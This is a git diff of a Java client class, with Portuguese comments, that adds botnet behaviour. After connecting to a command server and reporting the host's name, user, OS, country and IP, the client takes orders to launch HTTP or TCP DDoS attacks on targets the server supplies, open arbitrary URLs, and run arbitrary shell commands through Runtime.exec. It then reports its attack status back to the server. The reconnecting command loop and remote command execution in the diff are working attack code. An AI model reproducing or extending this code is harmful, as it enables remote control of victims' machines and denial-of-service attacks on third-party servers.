@@ -1,31 +1,30 @@
 import model.ConnectionData;
 import model.GenericMessage;
+import model.constant.ClientMessageTypeEnum;
 import model.constant.ClientStatusEnum;
-import model.constant.MessageTypeEnum;
 
+import java.awt.*;
 import java.io.*;
 import java.net.InetAddress;
 import java.net.Socket;
-import java.util.Objects;
+import java.net.URI;
 
 /**
  * Created by Douglas Giovanella on 31/07/2017.
  */
-public class Client {
+public class Client implements AttackCallback {
 
-    private static final String CONNECTED_SUCCESSFULLY = "connected successfully";
-    // TODO: Ver depois
     private static ObjectOutputStream oos;
+
     private int mPort;
     private String mCountry;
     private String mHostName;
     private String mUsername;
     private InetAddress mIpAddress;
     private String mOperationSystemName;
+
     private Socket mSocket;
-    private InputStream is;
     private ObjectInputStream input;
-    private OutputStream outputStream;
 
     private Client(String hostname, int port, String username, String operationSystemName, String country, InetAddress ipAddress) {
         this.mHostName = hostname;
@@ -51,12 +50,12 @@ public class Client {
         do {
             try {
                 mSocket = new Socket(mHostName, mPort);
-                outputStream = mSocket.getOutputStream();
+                OutputStream outputStream = mSocket.getOutputStream();
                 oos = new ObjectOutputStream(outputStream);
-                is = mSocket.getInputStream();
+                InputStream is = mSocket.getInputStream();
                 input = new ObjectInputStream(is);
             } catch (IOException e) {
-                System.err.println("Could not connect to server");
+                System.err.println("Failed to connect to server => " + e.getMessage());
             }
         } while (mSocket == null);
 
@@ -64,31 +63,74 @@ public class Client {
 
         try {
             sendClientData();
-            //sendMessage(CONNECTED_SUCCESSFULLY);
-            System.out.println("Sockets in and out ready!");
+            System.out.println("Client data sent");
             while (mSocket.isConnected()) {
 
+                System.out.println("Waiting server messages...");
                 GenericMessage message = (GenericMessage) input.readObject();
+
+                System.out.println("Received: " + message);
 
                 if (message != null) {
 
-                    System.out.println(message);
+                    boolean commandExecuted = false;
 
-                    switch (message.getType()) {
-                        case NOTIFICATION:
+                    switch (message.getAttackType()) {
+
+                        case HTTP:
+                            new DDOSAttack(message.getAsPair().first, this).httpAttack(message.getAsPair().second);
                             break;
-                        case DISCONNECTED:
+                        case TCP:
+                            new DDOSAttack(message.getAsPair().first, this).tcpAttack(message.getAsPair().second);
                             break;
-                        case STATUS_UPDATE:
+                        case BROWSE_URL:
+                            commandExecuted = browseURL(message.getAsString());
                             break;
+                        case COMMAND_LINE:
+                            commandExecuted = executeCommandLine(message.getAsString());
+                            break;
+                        default:
+                            commandExecuted = false;
+                    }
+
+                    if (message.isSentResponse()) {
+
+                        if (commandExecuted) {
+                            sendMessage("Comando executado!");
+                        } else {
+                            sendMessage("Falha ao executar comando: " + message.getAttackType());
+                        }
+
                     }
                 }
             }
         } catch (IOException | ClassNotFoundException e) {
+            System.out.println("Connection lost");
             e.printStackTrace();
+            mSocket = null;
+            connect();
         }
     }
 
+    private boolean browseURL(String url) {
+        try {
+            Desktop.getDesktop().browse(URI.create(url));
+            return true;
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        return false;
+    }
+
+    private boolean executeCommandLine(String command) {
+        try {
+            Runtime.getRuntime().exec(command);
+            return true;
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        return false;
+    }
 
     /***
      * Método usado para enviar mensagem para o server mSocket
@@ -98,17 +140,21 @@ public class Client {
     private void sendMessage(String msg) throws IOException {
         GenericMessage createMessage = new GenericMessage();
         createMessage.setData(msg);
-        createMessage.setType(Objects.equals(msg, CONNECTED_SUCCESSFULLY) ? MessageTypeEnum.CONNECTED : MessageTypeEnum.MESSAGE);
+        createMessage.setType(ClientMessageTypeEnum.MESSAGE);
         oos.writeObject(createMessage);
         oos.flush();
     }
 
-    public void sendStatusUpdate(ClientStatusEnum status) throws IOException {
-        GenericMessage createMessage = new GenericMessage();
-        createMessage.setType(MessageTypeEnum.STATUS_UPDATE);
-        createMessage.setData(status);
-        oos.writeObject(createMessage);
-        oos.flush();
+    private void sendStatusUpdate(ClientStatusEnum status) {
+        try {
+            GenericMessage createMessage = new GenericMessage();
+            createMessage.setType(ClientMessageTypeEnum.STATUS_UPDATE);
+            createMessage.setData(status);
+            oos.writeObject(createMessage);
+            oos.flush();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 
     /* esse método is usado para enviar a mensagem de conexao */
@@ -120,5 +166,15 @@ public class Client {
         createMessage.setIpAddress(mIpAddress);
         oos.writeObject(createMessage);
         oos.flush();
+    }
+
+    @Override
+    public void onStarted() {
+        sendStatusUpdate(ClientStatusEnum.ATTACKING);
+    }
+
+    @Override
+    public void onFinish() {
+        sendStatusUpdate(ClientStatusEnum.STAND_BY);
     }
 }
